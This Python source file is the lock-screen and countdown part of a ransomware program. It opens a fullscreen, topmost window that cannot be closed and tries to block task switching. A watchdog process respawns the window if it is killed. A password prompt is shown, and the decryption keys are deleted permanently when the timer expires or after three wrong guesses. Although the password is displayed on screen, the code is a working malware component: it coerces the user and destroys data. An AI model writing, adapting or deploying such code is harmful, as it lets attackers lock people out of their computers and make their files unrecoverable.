import os
import sys
import json
import time
import tkinter as tk
import multiprocessing
from datetime import datetime, timedelta
from Decrypt import decrypt_all_files
from Variables import script_files, seconds_left, password, timer_file_name

####################################################################################################################

def load_timer_data():
    if not os.path.exists(timer_file_name):
        return None
    with open(timer_file_name, "r") as file:
        try:
            data = json.load(file)
            return data
        except json.JSONDecodeError:
            return None

####################################################################################################################

# Global stop flag to kill the other processes
stop_flag = multiprocessing.Event()

def save_timer_data(start_time, expiration_time):
    try:
        with open(f"{timer_file_name}", "w") as f:
            json.dump({
                "start_time": start_time.isoformat(),
                "expiration_time": expiration_time.isoformat()
            }, f)
        print("Data successfully saved!")  # Debug Message
    except Exception as e:
        print(f"Error saving timer data: {e}")  # Debug Message

def load_timer_data():
    if os.path.exists(f"{timer_file_name}"):
        with open(f"{timer_file_name}", "r") as f:
            return json.load(f)
    return None

def delete_keys():
    try:
        for file in script_files:
            if os.path.exists(file):
                os.remove(file)
        print("All files have been deleted the system cannot be recovered.") # Debug Message
    except Exception as e:
        print(f"Failed to delete files: {e}") # Debug Message

####################################################################################################################

def timer_window():
    timer_data = load_timer_data()
    if timer_data:
        expiration_time = datetime.fromisoformat(timer_data["expiration_time"])
    else:
        start_time = datetime.now()
        expiration_time = start_time + timedelta(seconds=seconds_left)
        save_timer_data(start_time, expiration_time)

    attempts = 0

    def check_password():
        nonlocal attempts
        entered_password = password_entry.get()

        if entered_password == password:
            result_label.config(text="Password correct. Decrypting...")
            decrypt_all_files()
            delete_keys()
            stop_flag.set()
            root.quit()
            sys.exit()
        else:
            attempts += 1
            if attempts >= 3:
                result_label.config(text="TOLD YOU NOT TO TRY AND GUESS")
                root.update()
                time.sleep(5)
                delete_keys()
                stop_flag.set()
                root.quit()
                sys.exit()
            else:
                result_label.config(text="Incorrect password, DO NOT TRY AND GUESS IT!!!")

    def update_timer():
        remaining_time = int((expiration_time - datetime.now()).total_seconds())
        if remaining_time > 0:
            timer_label.config(text=f"Time Left: {remaining_time}")
            root.after(1000, update_timer)
        else:
            delete_keys()
            root.quit()

    root = tk.Tk()

    root.attributes('-fullscreen', True)

    root.attributes('-topmost', True)

    root.bind("<Alt-Tab>", lambda e: "break")

    root.resizable(False, False)

    root.protocol("WM_DELETE_WINDOW", lambda: None)

    root.title("Timer")
    root.configure(bg="black")

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    root.geometry(f"{screen_width}x{screen_height}")

    timer_label = tk.Label(root, font=("Helvetica", 50), fg="white", bg="black")
    timer_label.pack(pady=50)

    password_entry = tk.Entry(root, show="*", font=("Helvetica", 24), width=20)
    password_entry.pack(pady=10)

    submit_button = tk.Button(root, text="Submit Password", command=check_password, font=("Helvetica", 24), bg="red", fg="white", width=20)
    submit_button.pack(pady=20)

    result_label = tk.Label(root, text="", font=("Helvetica", 24), fg="yellow", bg="black")
    result_label.pack(pady=20)

    permanent_message_label = tk.Label(root, text=f"Password = {password}", 
    font=("Helvetica", 20), fg="white", bg="black", justify=tk.CENTER)
    permanent_message_label.pack(pady=50)

    update_timer()
    root.mainloop()

####################################################################################################################

def watchdog_timer():
    timer_process = None

    while not stop_flag.is_set():
        if timer_process is None or not timer_process.is_alive():
            timer_process = multiprocessing.Process(target=timer_window)
            timer_process.start()

        time.sleep(0.2)

    print("Watchdog shut down") # Debug Message
    time.sleep(1)
    sys.exit()

####################################################################################################################